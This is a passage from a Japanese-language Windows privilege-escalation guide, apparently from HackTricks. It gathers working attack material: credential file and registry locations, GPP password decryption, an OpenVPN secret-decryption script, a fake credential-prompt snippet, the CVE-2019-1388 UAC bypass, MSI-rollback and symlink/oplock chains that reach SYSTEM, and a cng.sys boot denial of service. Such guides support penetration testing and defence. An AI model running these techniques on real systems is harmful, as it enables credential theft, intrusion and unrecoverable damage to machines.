<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM バックアップ
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml**という名前のファイルを検索します。

### Cached GPP Pasword

以前は、Group Policy Preferences（GPP）を使用して、カスタムのローカル administrator account を複数のマシンに展開できる機能が提供されていました。しかし、この方法には重大な security flaw がありました。第一に、SYSVOL に XML ファイルとして保存されている Group Policy Object（GPO）は、すべての domain user からアクセス可能でした。第二に、公開されているデフォルトキーを使用して AES256 で暗号化された、これらの GPP 内の password は、認証済みの user であれば誰でも復号できました。これにより、user が elevated privilege を取得できる可能性があり、重大な risk が生じていました。

この risk を軽減するため、空でない `"cpassword"` field を含む、ローカルに cache された GPP file を検索する function が開発されました。そのような file が見つかると、function は password を復号し、custom PowerShell object を返します。この object には、GPP と file の location に関する詳細が含まれており、この security vulnerability の特定と remediation に役立ちます。

`C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history**（W Vista より前）_ で、以下の file を検索します。

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexecを使用してパスワードを取得する:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
認証情報を含む web.config の例:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN認証情報
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### ログ
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 認証情報を尋ねる

ユーザーが知っている可能性があると思うなら、いつでも**ユーザーに自身の認証情報、あるいは別のユーザーの認証情報を入力するよう求める**ことができます（クライアントに直接**認証情報**を**尋ねる**のは非常に**危険**であることに注意してください）：
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **credentialsを含む可能性のあるファイル名**

以前、**passwords**が**clear-text**または**Base64**で含まれていた既知のファイル
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
提案されたすべてのファイルを検索:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin 内の Credentials

Credentials を探すために Bin も確認する必要があります

複数のプログラムで保存された **passwords を recover** するには、次を使用できます: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### registry 内

**Credentials を含む可能性があるその他の registry keys**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**registry から openssh keys を抽出。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browsers History

**Chrome または Firefox** のパスワードが保存されている dbs を確認します。\
また、ブラウザの履歴、ブックマーク、favourites も確認してください。そこに**パスワードが**保存されている可能性があります。

ブラウザからパスワードを抽出する Tools:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** は Windows operating system に組み込まれた technology で、異なる言語で作成された software components 間の**相互通信**を可能にします。各 COM component は **class ID (CLSID)** によって**識別**され、各 component は 1 つ以上の interfaces を通じて functionality を公開します。interfaces は interface IDs (IIDs) によって識別されます。

COM classes と interfaces は、それぞれ registry の **HKEY\CLASSES\ROOT\CLSID** と **HKEY\CLASSES\ROOT\Interface** に定義されています。この registry は、**HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** を merge して作成されます = **HKEY\CLASSES\ROOT.**

この registry の CLSIDs 内には、child registry **InProcServer32** があります。これには **DLL** を指す **default value** と、**ThreadingModel** という value が含まれています。ThreadingModel には **Apartment** (Single-Threaded)、**Free** (Multi-Threaded)、**Both** (Single or Multi)、**Neutral** (Thread Neutral) があります。

![Browsers History - COM DLL Overwriting: この registry の CLSIDs 内には、DLL を指す default value と value called ThreadingModel を含む child registry InProcServer32 があります...](<../../images/image (729).png>)

基本的に、実行される **DLL のいずれかを overwrite** でき、その DLL が別の user によって実行される場合、**privileges を escalate** できます。

攻撃者が COM Hijacking を persistence mechanism として使用する方法については、以下を確認してください:


{{#ref}}
com-hijacking.md
{{#endref}}

### **files と registry 内の Generic Password search**

**file contents を Search**する
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**特定のファイル名を持つファイルを検索**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**レジストリでキー名とパスワードを検索**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### パスワードを検索するTools

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin I have created this plugin to **automatically execute every metasploit POST module that searches for credentials** inside the victim.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は、このページで言及されているパスワードを含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) は、system からパスワードを抽出するもう1つの優れたToolです。

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、データをclear textで保存する複数のTool（PuTTY、WinSCP、FileZilla、SuperPuTTY、RDP）の **sessions**、**usernames**、**passwords** を検索します。
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## 漏洩したハンドル

**SYSTEM として実行されているプロセスが、フルアクセス権限で新しいプロセス**（`OpenProcess()`）**を開いた**とします。同じプロセスが、**メインプロセスのすべてのオープンハンドルを継承する、低い権限の新しいプロセス**（`CreateProcess()`）**も作成**したとします。\
その後、**低い権限のプロセスに対するフルアクセス権限**を取得できれば、`OpenProcess()` で作成された特権プロセスへの**オープンハンドルを取得**して、**shellcode をインジェクト**できます。\
この脆弱性の**検出および悪用方法**の詳細については、[この例を参照してください。](leaked-handle-exploitation.md)\
異なる権限レベル（フルアクセスのみではありません）で継承された、プロセスおよびスレッドのより多くのオープンハンドルをテストして悪用する方法について、より詳しい説明は[この**別の投稿**を参照してください。](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

共有メモリセグメントは**パイプ**と呼ばれ、プロセス間の通信およびデータ転送を可能にします。

Windows には **Named Pipes** と呼ばれる機能があり、異なるネットワーク上にある場合でも、無関係なプロセス間でデータを共有できます。これはクライアント/サーバーアーキテクチャに似ており、役割は **named pipe server** と **named pipe client** として定義されます。

**client** がパイプを介してデータを送信すると、パイプを設定した **server** は、必要な **SeImpersonate** 権限を持っている場合、**client の identity を引き受ける**ことができます。模倣可能なパイプを介して通信する**特権プロセス**を特定できれば、確立したパイプとそのプロセスがやり取りした際に、そのプロセスの identity を引き受けることで、**より高い権限を取得**できる可能性があります。この攻撃の実行方法については、[**こちら**](named-pipe-client-impersonation.md) および [**こちら**](#from-high-integrity-to-system) に役立つガイドがあります。

また、次の tool を使用すると、burp のような tool で **named pipe 通信をインターセプト**できます。[**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **また、次の tool を使用すると、すべての pipe を一覧表示および確認して privescs を探すことができます** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony service（TapiSrv）は server mode で `\\pipe\\tapsrv`（MS-TRP）を公開します。リモートの認証済み client は、mailslot ベースの async event path を悪用して、`ClientAttach` を `NETWORK SERVICE` が書き込み可能な既存ファイルへの任意の **4-byte write** に変換し、その後 Telephony admin 権限を取得して service として任意の DLL をロードできます。完全な flow は次のとおりです。

- `pszDomainUser` に書き込み可能な既存 path を設定して `ClientAttach` → service が `CreateFileW(..., OPEN_EXISTING)` を介してそのファイルを開き、async event writes に使用します。
- 各 event は、`Initialize` で attacker が制御する `InitContext` をその handle に書き込みます。`LRegisterRequestRecipient`（`Req_Func 61`）で line app を登録し、`TRequestMakeCall`（`Req_Func 121`）を trigger し、`GetAsyncEvents`（`Req_Func 0`）で取得した後、unregister/shutdown して deterministic な write を繰り返します。
- `C:\Windows\TAPI\tsec.ini` の `[TapiAdministrators]` に自分自身を追加して reconnect し、任意の DLL path を指定して `GetUIDllName` を呼び出すことで、`NETWORK SERVICE` として `TSPI_providerUIIdentify` を実行します。

詳細:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## その他

### Windows で実行可能な File Extensions

**[https://filesec.io/](https://filesec.io/)** のページを確認してください。

### Markdown renderer を介した Protocol handler / ShellExecute abuse

`ShellExecuteExW` に転送されるクリック可能な Markdown link は、危険な URI handler（`file:`, `ms-appinstaller:`、または登録済みの scheme）を trigger し、現在の user として attacker が制御する file を実行する可能性があります。詳細:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **パスワードの Command Line を Monitoring**

user として shell を取得した場合、**command line で credentials を渡している** scheduled task やその他の process が実行されている可能性があります。以下の script は、2 秒ごとに process command line を取得し、現在の state と前回の state を比較して、差分を出力します。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## プロセスからパスワードを盗む

## Low Priv User から NT\AUTHORITY SYSTEM へ (CVE-2019-1388) / UAC Bypass

グラフィカルインターフェース（コンソールまたは RDP 経由）にアクセスでき、UAC が有効になっている場合、Microsoft Windows の一部のバージョンでは、権限のないユーザーから「NT\AUTHORITY SYSTEM」などの terminal やその他のプロセスを実行できます。

これにより、同じ脆弱性を利用して権限昇格と UAC Bypass を同時に実行できます。さらに、何もインストールする必要はなく、プロセス中に使用される binary は Microsoft によって署名・発行されています。

影響を受けるシステムには、次のようなものがあります:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
この脆弱性を悪用するには、次の手順を実行する必要があります:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Administrator Medium から High Integrity Level / UAC Bypass へ

**Integrity Levels について学ぶには、こちらを読んでください:**


{{#ref}}
integrity-levels.md
{{#endref}}

次に、**UAC と UAC bypasses について学ぶには、こちらを読んでください:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Arbitrary Folder Delete/Move/Rename から SYSTEM EoP へ

[**この blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) で説明されている technique で、exploit code は[**こちらで入手できます**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)。

この attack は基本的に、Windows Installer の rollback feature を悪用して、uninstallation process 中に正規の files を malicious files に置き換えます。このため attacker は、**malicious MSI installer** を作成する必要があります。この installer は `C:\Config.Msi` folder を hijack するために使用され、その後 Windows Installer によって、他の MSI packages の uninstallation 中に rollback files を保存するために使用されます。この rollback files は、malicious payload を含むように変更されます。

Technique の概要は次のとおりです:

1. **Stage 1 – Hijack の準備（`C:\Config.Msi` を空にする）**

- Step 1: MSI の install
- writable folder（`TARGETDIR`）に harmless file（例: `dummy.txt`）を install する `.msi` を作成します。
- **"UAC Compliant"** として installer を mark し、**non-admin user** が実行できるようにします。
- install 後も file への **handle** を open のままにします。

- Step 2: Uninstall の開始
- 同じ `.msi` を uninstall します。
- uninstall process が files を `C:\Config.Msi` に移動し、`.rbf` files（rollback backups）へ rename し始めます。
- `GetFinalPathNameByHandle` を使用して open file handle を **poll** し、file が `C:\Config.Msi\<random>.rbf` になったことを検出します。

- Step 3: Custom Syncing
- `.msi` には、以下を行う **custom uninstall action (`SyncOnRbfWritten`)** が含まれています:
- `.rbf` が書き込まれたことを signal します。
- その後、uninstall を続行する前に別の event を wait します。

- Step 4: `.rbf` の deletion を block
- signal を受け取ったら、`FILE_SHARE_DELETE` なしで `.rbf` file を **open** します — これにより **deletion が防止されます**。
- その後、uninstall が完了できるように signal を返します。
- Windows Installer は `.rbf` の deletion に失敗し、すべての contents を delete できないため、`C:\Config.Msi` は削除されません。

- Step 5: `.rbf` を手動で delete
- attacker であるあなたが `.rbf` file を手動で delete します。
- これで **`C:\Config.Msi` は空** になり、hijack の準備が整います。

> この時点で、**SYSTEM-level の arbitrary folder delete vulnerability を trigger** して `C:\Config.Msi` を delete します。

2. **Stage 2 – Rollback Scripts を Malicious Ones に置き換える**

- Step 6: Weak ACLs を設定して `C:\Config.Msi` を再作成
- `C:\Config.Msi` folder を自分で再作成します。
- **weak DACLs**（例: Everyone:F）を設定し、`WRITE_DAC` を持つ handle を **open のままにします**。

- Step 7: 別の install を実行
- 次の設定で `.msi` を再度 install します:
- `TARGETDIR`: Writable location。
- `ERROROUT`: forced failure を trigger する variable。
- この install は、`.rbs` と `.rbf` を再び read する **rollback** を trigger するために使用されます。

- Step 8: `.rbs` を monitor
- `ReadDirectoryChangesW` を使用して `C:\Config.Msi` を monitor し、新しい `.rbs` が現れるまで待ちます。
- その filename を capture します。

- Step 9: Rollback 前に sync
- `.msi` には、以下を行う **custom install action (`SyncBeforeRollback`)** が含まれています:
- `.rbs` が作成されたときに event を signal します。
- その後、続行する前に wait します。

- Step 10: Weak ACL を再適用
- `.rbs created` event を受信した後:
- Windows Installer は `C:\Config.Msi` に **strong ACLs を再適用** します。
- しかし、`WRITE_DAC` を持つ handle をまだ保持しているため、再び **weak ACLs を再適用** できます。

> ACLs は **handle open 時にのみ enforcement される** ため、folder への write は引き続き可能です。

- Step 11: Fake `.rbs` と `.rbf` を drop
- `.rbs` file を、Windows に次の処理を指示する **fake rollback script** で overwrite します:
- `.rbf` file（malicious DLL）を **privileged location**（例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）へ restore します。
- **malicious SYSTEM-level payload DLL** を含む fake `.rbf` を drop します。

- Step 12: Rollback を trigger
- sync event を signal し、installer を再開させます。
- **type 19 custom action (`ErrorOut`)** は、既知の point で install を **intentionally fail** させるように設定されています。
- これにより **rollback が開始** されます。

- Step 13: SYSTEM が DLL を install
- Windows Installer は:
- malicious `.rbs` を read します。
- `.rbf` DLL を target location に copy します。
- これで、**SYSTEM に load される path に malicious DLL** が配置されます。

- Final Step: SYSTEM code を execute
- hijack した DLL を load する trusted **auto-elevated binary**（例: `osk.exe`）を実行します。
- **Boom**: あなたの code が **SYSTEM として実行** されます。


### Arbitrary File Delete/Move/Rename から SYSTEM EoP へ

主な MSI rollback technique（前述のもの）は、**entire folder**（例: `C:\Config.Msi`）を delete できることを前提としています。しかし、vulnerability が **arbitrary file deletion** しか許可しない場合はどうでしょうか？

**NTFS internals** を exploit できます: すべての folder には、次の名前の hidden alternate data stream があります:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
この stream には、フォルダーの **インデックスメタデータ** が保存されています。

したがって、フォルダーの **`::$INDEX_ALLOCATION` stream** を**削除**すると、NTFS はファイルシステムから**フォルダー全体を削除**します。

これは、次のような標準のファイル削除 API を使用して実行できます。
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> *file* delete API を呼び出しているにもかかわらず、**folder 自体が削除されます**。

### Folder Contents Delete から SYSTEM EoP へ
primitive が任意の file/folder を削除できなくても、**攻撃者が制御する folder の *contents* を削除できる**場合はどうでしょうか？

1. Step 1: bait folder と file をセットアップする
- 作成: `C:\temp\folder1`
- その中に: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` に **oplock** を設定する
- privileged process が `file1.txt` を削除しようとすると、oplock によって **実行が一時停止**します。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Step 3: SYSTEM process（例: `SilentCleanup`）をトリガーする
- このプロセスはフォルダー（例: `%TEMP%`）をスキャンし、その内容を削除しようとします。
- `file1.txt` に到達すると、**oplock がトリガーされ**、callback に制御が渡されます。

4. Step 4: oplock callback 内 — 削除先をリダイレクトする

- Option A: `file1.txt` を別の場所へ移動する
- これにより、oplock を壊さずに `folder1` を空にできます。
- `file1.txt` を直接削除しないでください。削除すると、oplock が早期に解放されます。

- Option B: `folder1` を **junction** に変換する:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- オプション C: `\RPC Control` に **symlink** を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> これはフォルダーのメタデータを保存する NTFS 内部ストリームを対象としています — これを削除するとフォルダーが削除されます。

5. Step 5: oplock を解放する
- SYSTEM process は処理を続行し、`file1.txt` の削除を試みます。
- しかし、junction + symlink により、実際に削除されるのは次のものです：
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**結果**: `C:\Config.Msi` は SYSTEM によって削除されます。

### 任意のフォルダー作成から恒久的な DoS へ

**ファイルを書き込めない**、または**弱い権限を設定できない**場合でも、**SYSTEM/admin として任意のフォルダーを作成できる** primitive を exploit します。

**ファイルではなくフォルダー**を、**重要な Windows driver** の名前で作成します。例:
```
C:\Windows\System32\cng.sys
```
- このパスは通常、`cng.sys` kernel-mode driver に対応します。
- **フォルダーとして事前に作成**すると、Windows は boot 時に実際の driver をロードできなくなります。
- その後、Windows は boot 中に `cng.sys` のロードを試みます。
- フォルダーを検出し、**実際の driver の解決に失敗**して、**crash または boot の停止**が発生します。
- **fallback はなく**、外部からの介入（例: boot repair または disk access）なしでは**復旧できません**。

### 特権 log/backup パス + OM symlinks から arbitrary file overwrite / boot DoS へ

**privileged service** が、**writable config** から読み取ったパスに logs/exports を書き込む場合、**Object Manager symlinks + NTFS mount points** でそのパスを redirect し、特権による write を arbitrary overwrite に変えられます（**SeCreateSymbolicLinkPrivilege がなくても**可能）。

**Requirements**
- target path を保存している config が attacker によって writable であること（例: `%ProgramData%\...\.ini`）。
- `\RPC Control` への mount point と OM file symlink を作成できること（James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。
- そのパスに write する privileged operation（log、export、report）。

**Example chain**
1. config を読み取り、privileged log destination を復元します。例: `C:\ProgramData\ICONICS\IcoSetup64.ini` 内の `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`。
2. admin なしでパスを redirect します。
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Privileged component が log を書き込むのを待つ（例: admin が「send test SMS」を実行する）。これで書き込み先は `C:\Windows\System32\cng.sys` になる。
4. 上書きされた target を調査する（hex/PE parser）ことで corruption を確認する。reboot により Windows が改ざんされた driver path をロードするため、**boot loop DoS** が発生する。これは、privileged service が write 用に開く protected file にも一般化できる。

> `cng.sys` は通常 `C:\Windows\System32\drivers\cng.sys` からロードされるが、`C:\Windows\System32\cng.sys` に copy が存在する場合は、そちらが先に試行される可能性があるため、破損データの信頼できる DoS sink になる。



## **High Integrity から SYSTEM へ**

### **New service**

すでに High Integrity process 上で実行している場合、**新しい service を作成して実行する**だけで、**SYSTEM への path** は簡単になる場合がある:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> サービスバイナリを作成する場合は、それが有効なサービスであること、またはバイナリが必要なアクションを迅速に実行することを確認してください。有効なサービスでない場合、20秒後に強制終了されます。

### AlwaysInstallElevated

High Integrity プロセスから、**AlwaysInstallElevated レジストリエントリを有効化**し、_**.msi**_ wrapper を使用して reverse shell を**インストール**できます。\
[関連するレジストリキーと _.msi_ パッケージのインストール方法についての詳細はこちら。](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**コードは** [**こちらにあります**](seimpersonate-from-high-to-system.md)**。**

### From SeDebug + SeImpersonate to Full Token privileges

これらの token privileges を持っている場合（おそらく、すでに High Integrity のプロセス内で確認できます）、SeDebug privilege を使用して**ほぼすべてのプロセス**（protected processes を除く）を**開き**、そのプロセスの **token をコピー**して、その token を使用した**任意のプロセスを作成**できます。\
この technique では通常、**すべての token privileges を持つ SYSTEM として実行されているプロセスを選択**します（_すべての token privileges を持たない SYSTEM プロセスも存在します_）。\
提案した technique を実行するコードの [**例はこちらにあります**](sedebug-+-seimpersonate-copy-token.md)**。**

### **Named Pipes**

この technique は meterpreter が `getsystem` で privilege escalation を行うために使用します。この technique は、**pipe を作成し、その pipe に書き込むための service を作成または悪用する**というものです。その後、**`SeImpersonate`** privilege を使用して pipe を作成した **server** は、pipe client（service）の **token を impersonate** し、SYSTEM privileges を取得できます。\
name pipes について[**詳しく知りたい場合はこちらを読んでください**](#named-pipe-client-impersonation)。\
name pipes を使用して [**high integrity から System へ移行する方法の例を読みたい場合はこちらを読んでください**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

**SYSTEM** として実行されている **process** によって **loaded** される dll を**hijack**できれば、その permissions で任意のコードを実行できます。したがって、Dll Hijacking はこの種の privilege escalation にも有効です。さらに、dll のロードに使用されるフォルダーへの **write permissions** を持つため、**high integrity process からの方がはるかに簡単に実行できます**。\
**Dll hijacking の詳細は** [**こちらで確認できます**](dll-hijacking/index.html)**。**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vectors を探すための最適な tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations と sensitive files を確認（**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- いくつかの可能な misconfigurations を確認し、情報を収集（**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations を確認**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、RDP に保存された session information を抽出します。local では -Thorough を使用します。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager から credentials を抽出します。Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集した passwords を domain 全体に対して spray します**\
